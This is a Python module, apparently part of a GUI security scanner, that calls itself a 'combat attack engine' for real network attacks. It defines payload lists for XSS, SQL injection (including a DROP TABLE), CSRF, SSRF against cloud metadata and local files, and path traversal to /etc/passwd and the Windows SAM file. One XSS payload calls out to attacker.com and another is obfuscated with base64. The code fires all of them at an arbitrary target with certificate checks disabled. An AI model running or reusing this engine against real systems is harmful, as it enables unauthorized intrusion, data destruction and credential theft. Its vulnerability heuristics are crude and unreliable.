# xss_security_gui/combat_attack_engine.py
"""
Combat Attack Engine — Реальные боевые сетевые атаки
Автор: GitHub Copilot
"""
import time
import json
import requests
import threading
import queue
from typing import Dict, List, Any, Callable, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
import logging

logger = logging.getLogger("CombatAttackEngine")

# ============================================================
#  Payload Templates (Боевые шаблоны)
# ============================================================

XSS_PAYLOADS = [
    '<img src=x onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '<img src=x onerror=fetch("http://attacker.com/log?xss=1")>',
    '<svg/onload=eval(atob("YWxlcnQoJ1hTUycp"))>',
    'jaVasCript:/**/alert("XSS")',
    '<marquee onstart="alert(\'XSS\')">',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'--",
    "1' UNION SELECT NULL--",
    "1'; DROP TABLE users--",
    "1' AND '1'='1",
    "admin' --",
    "1' OR 1=1--",
    "' UNION ALL SELECT NULL,NULL--",
    "1' AND SLEEP(5)--",
    "1' OR 'a'='a",
]

CSRF_PAYLOADS = [
    '<img src="http://target.com/api/admin/delete?user_id=1">',
    '<iframe src="http://target.com/api/settings/update?admin=true"></iframe>',
    '<form action="http://target.com/api/transfer" method="POST"><input name="amount" value="1000"><script>document.forms[0].submit()</script></form>',
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:8080",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/admin",
    "file:///etc/passwd",
    "http://127.0.0.1:3306/",
    "gopher://localhost:25/",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/hosts",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

# ============================================================
#  Attack Result Class
# ============================================================

class AttackResult:
    """Результат одиночной атаки"""

    def __init__(self, attack_type: str, endpoint: str, payload: str):
        self.attack_type = attack_type
        self.endpoint = endpoint
        self.payload = payload
        self.timestamp = datetime.now().isoformat()
        self.success = False
        self.vulnerable = False
        self.response_code = None
        self.response_time = 0.0
        self.response_body = ""
        self.evidence = []
        self.severity = "INFO"
        self.notes = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type,
            "endpoint": self.endpoint,
            "payload": self.payload[:100],  # Truncate payload
            "vulnerable": self.vulnerable,
            "severity": self.severity,
            "response_code": self.response_code,
            "response_time": round(self.response_time, 3),
            "timestamp": self.timestamp,
            "notes": self.notes,
            "evidence_count": len(self.evidence),
        }


# ============================================================
#  Combat Attack Engine
# ============================================================

class CombatAttackEngine:
    """
    Боевой двигатель атак.
    Выполняет реальные XSS, SQLi, CSRF, SSRF, LFI атаки.
    Результаты отправляются в очередь для GUI.
    """

    def __init__(self,
                 target_url: str,
                 result_queue: queue.Queue,
                 progress_callback: Optional[Callable] = None,
                 timeout: float = 10.0):
        self.target_url = target_url
        self.result_queue = result_queue
        self.progress_callback = progress_callback
        self.timeout = timeout
        self.stop_flag = threading.Event()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (XSS-Scanner v6.0)",
            "Accept": "*/*"
        })

        self.attack_results: List[AttackResult] = []
        self.total_attacks = 0
        self.completed_attacks = 0

    def _emit_progress(self, msg: str, progress_pct: int = 0):
        """Отправить сообщение прогресса"""
        if self.progress_callback:
            try:
                self.progress_callback(msg, progress_pct)
            except Exception as e:
                logger.warning(f"Progress callback error: {e}")

        # Также отправляем в очередь
        try:
            self.result_queue.put({
                "type": "progress",
                "message": msg,
                "progress": progress_pct,
                "timestamp": datetime.now().isoformat()
            }, timeout=1)
        except queue.Full:
            pass

    def _emit_result(self, result: AttackResult):
        """Отправить результат атаки"""
        self.attack_results.append(result)
        self.completed_attacks += 1

        try:
            self.result_queue.put({
                "type": "attack_result",
                "data": result.to_dict(),
                "timestamp": datetime.now().isoformat()
            }, timeout=1)
        except queue.Full:
            pass

        # Прогресс
        progress_pct = int((self.completed_attacks / max(1, self.total_attacks)) * 100)
        self._emit_progress(f"🎯 Атак выполнено: {self.completed_attacks}/{self.total_attacks}", progress_pct)

    def attack_xss(self, endpoints: List[str] = None) -> List[AttackResult]:
        """Атака на XSS уязвимости"""
        if not endpoints:
            endpoints = [self.target_url]

        self._emit_progress(f"🔴 Начинаем XSS атаки на {len(endpoints)} endpoints...", 5)
        results = []

        for endpoint in endpoints:
            if self.stop_flag.is_set():
                break

            for payload in XSS_PAYLOADS:
                if self.stop_flag.is_set():
                    break

                result = AttackResult("XSS", endpoint, payload)

                try:
                    # Попытка 1: GET параметр
                    test_url = f"{endpoint}?q={payload}" if "?" not in endpoint else f"{endpoint}&q={payload}"

                    start_time = time.time()
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    result.response_time = time.time() - start_time
                    result.response_code = resp.status_code
                    result.response_body = resp.text[:1000]
                    result.success = True

                    # Анализ ответа на наличие payload
                    if payload in resp.text:
                        result.vulnerable = True
                        result.severity = "HIGH"
                        result.evidence.append(f"Payload отражен в ответе")
                        result.notes = f"Потенциально уязвим на XSS (отражен payload)"
                    elif "error" in resp.text.lower() or "invalid" in resp.text.lower():
                        result.severity = "MEDIUM"
                        result.notes = "Возможна парсинговая ошибка"

                    # Попытка 2: POST параметр
                    if not result.vulnerable:
                        try:
                            post_resp = self.session.post(endpoint,
                                                          data={"q": payload},
                                                          timeout=self.timeout,
                                                          verify=False)
                            if payload in post_resp.text:
                                result.vulnerable = True
                                result.severity = "HIGH"
                                result.evidence.append(f"Payload отражен в POST ответе")
                                result.notes = "Уязвим на XSS (POST)"
                        except Exception:
                            pass

                    self._emit_result(result)
                    results.append(result)
                    time.sleep(0.1)  # Rate limit

                except Exception as e:
                    result.notes = f"Ошибка: {str(e)[:100]}"
                    logger.debug(f"XSS attack error: {e}")

        return results

    def attack_sqli(self, params: Dict = None) -> List[AttackResult]:
        """Атака на SQL Injection"""
        self._emit_progress(f"🟠 Начинаем SQLi атаки...", 30)
        results = []

        if not params:
            params = {"id": "1", "user": "admin", "search": "test"}

        for param_name, param_value in params.items():
            if self.stop_flag.is_set():
                break

            for payload in SQLI_PAYLOADS:
                if self.stop_flag.is_set():
                    break

                result = AttackResult("SQLi", f"{self.target_url}?{param_name}=...", payload)

                try:
                    test_params = {param_name: payload}

                    start_time = time.time()
                    resp = self.session.get(self.target_url,
                                           params=test_params,
                                           timeout=self.timeout,
                                           verify=False)
                    result.response_time = time.time() - start_time
                    result.response_code = resp.status_code
                    result.response_body = resp.text[:1000]
                    result.success = True

                    # Анализ на SQLi признаки
                    sqli_indicators = ["sql", "syntax", "error", "mysql", "postgresql", "oracle", "database"]
                    if any(ind in resp.text.lower() for ind in sqli_indicators):
                        result.vulnerable = True
                        result.severity = "CRITICAL"
                        result.evidence.append("SQL ошибка в ответе")
                        result.notes = "Потенциально уязвим на SQLi"

                    # Проверка времени ответа (time-based SQLi)
                    if result.response_time > 5.0:
                        result.notes += f" (Время ответа: {result.response_time:.2f}s - возможен time-based SQLi)"
                        if not result.vulnerable:
                            result.vulnerable = True
                            result.severity = "HIGH"

                    self._emit_result(result)
                    results.append(result)
                    time.sleep(0.2)

                except Exception as e:
                    result.notes = f"Ошибка: {str(e)[:100]}"
                    logger.debug(f"SQLi attack error: {e}")

        return results

    def attack_csrf(self) -> List[AttackResult]:
        """Атака на CSRF"""
        self._emit_progress(f"🟡 Проверяем CSRF защиту...", 55)
        results = []

        for payload in CSRF_PAYLOADS[:3]:  # Ограничиваем количество
            if self.stop_flag.is_set():
                break

            result = AttackResult("CSRF", self.target_url, payload)

            try:
                # Проверяем наличие CSRF токена в форме
                resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
                result.response_code = resp.status_code
                result.success = True

                csrf_indicators = ["csrf", "token", "crumb", "nonce", "_token"]
                has_csrf_protection = any(ind in resp.text.lower() for ind in csrf_indicators)

                if not has_csrf_protection:
                    result.vulnerable = True
                    result.severity = "HIGH"
                    result.evidence.append("Отсутствует CSRF защита")
                    result.notes = "Форма не защищена CSRF токеном"
                else:
                    result.notes = "Форма содержит CSRF защиту"

                self._emit_result(result)
                results.append(result)

            except Exception as e:
                result.notes = f"Ошибка: {str(e)[:100]}"
                logger.debug(f"CSRF attack error: {e}")

        return results

    def attack_ssrf(self) -> List[AttackResult]:
        """Атака на SSRF"""
        self._emit_progress(f"🔵 Проверяем SSRF...", 70)
        results = []

        for payload in SSRF_PAYLOADS[:5]:
            if self.stop_flag.is_set():
                break

            result = AttackResult("SSRF", self.target_url, payload)

            try:
                test_url = f"{self.target_url}?url={payload}" if "?" not in self.target_url else f"{self.target_url}&url={payload}"

                start_time = time.time()
                resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                result.response_time = time.time() - start_time
                result.response_code = resp.status_code
                result.success = True

                # Анализ на SSRF признаки
                if resp.status_code == 200 and len(resp.text) > 100:
                    result.vulnerable = True
                    result.severity = "CRITICAL"
                    result.evidence.append("Возможен доступ к внутренним ресурсам")
                    result.notes = "Потенциально уязвим на SSRF"

                self._emit_result(result)
                results.append(result)
                time.sleep(0.1)

            except Exception as e:
                result.notes = f"Ошибка: {str(e)[:100]}"

        return results

    def attack_lfi(self) -> List[AttackResult]:
        """Атака на LFI"""
        self._emit_progress(f"🟣 Проверяем LFI...", 85)
        results = []

        for payload in LFI_PAYLOADS[:5]:
            if self.stop_flag.is_set():
                break

            result = AttackResult("LFI", self.target_url, payload)

            try:
                test_url = f"{self.target_url}?file={payload}" if "?" not in self.target_url else f"{self.target_url}&file={payload}"

                resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                result.response_code = resp.status_code
                result.success = True

                # Анализ на LFI признаки
                lfi_indicators = ["root:", "bin:", "daemon:", "nobody:"]  # /etc/passwd indicators
                if any(ind in resp.text for ind in lfi_indicators):
                    result.vulnerable = True
                    result.severity = "CRITICAL"
                    result.evidence.append("Файл /etc/passwd может быть доступен")
                    result.notes = "Потенциально уязвим на LFI"

                self._emit_result(result)
                results.append(result)
                time.sleep(0.1)

            except Exception as e:
                result.notes = f"Ошибка: {str(e)[:100]}"

        return results

    def run_all_attacks(self) -> Dict[str, Any]:
        """Запустить все атаки последовательно"""
        self._emit_progress("🚀 Запуск полного боевого цикла атак...", 1)

        all_results = {
            "xss": self.attack_xss(),
            "sqli": self.attack_sqli(),
            "csrf": self.attack_csrf(),
            "ssrf": self.attack_ssrf(),
            "lfi": self.attack_lfi(),
        }

        # Анализ результатов
        vulnerable_count = sum(1 for results in all_results.values()
                               for r in results if r.vulnerable)
        critical_count = sum(1 for results in all_results.values()
                            for r in results if r.severity == "CRITICAL")

        self._emit_progress(
            f"✅ Атаки завершены! Найдено уязвимостей: {vulnerable_count}, CRITICAL: {critical_count}",
            100
        )

        return {
            "target": self.target_url,
            "timestamp": datetime.now().isoformat(),
            "total_attacks": self.completed_attacks,
            "vulnerable_found": vulnerable_count,
            "critical_severity": critical_count,
            "results_by_type": all_results,
        }

    def stop(self):
        """Остановить атаки"""
        self.stop_flag.set()
        self._emit_progress("⏸️ Атаки остановлены", 0)

